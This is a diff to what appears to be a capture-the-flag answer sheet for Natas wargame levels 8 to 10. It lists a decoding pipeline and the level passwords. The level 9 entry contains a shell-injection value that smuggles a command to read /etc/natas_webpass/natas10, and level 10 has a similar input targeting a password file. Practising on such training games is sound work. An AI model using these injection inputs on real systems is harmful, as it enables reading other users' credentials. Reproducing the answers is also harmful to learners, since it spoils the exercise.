@@ -50,5 +50,22 @@ password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 # 8
+```bash
+echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -D
+oubWYf2kBq
+```
+password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
+# 9
+sh injection
+```bash
+; cat /etc/natas_webpass/natas10;
+```
+password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+#10
+```
+c /etc/natas_webpass/natas11
+```
+password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
